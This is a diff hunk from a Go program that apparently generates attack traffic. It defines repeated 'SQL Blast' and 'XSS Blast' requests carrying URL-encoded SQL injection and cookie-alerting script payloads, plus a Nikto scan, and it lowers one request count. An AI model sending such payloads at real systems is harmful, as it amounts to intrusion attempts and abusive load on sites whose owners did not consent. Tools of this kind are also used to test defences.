@@ -113,7 +113,7 @@ func (p *program) Start(s service.Service) error {
 	sqlBlast = Attack{name: "SQL Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
 		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
 	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
-		minRequests: 800, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
+		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
 
 	/* Attack Tools */
 	niktoBlast = Tool{name: "Nikto Blast", location: "nikto/program/nikto.pl", host: target}
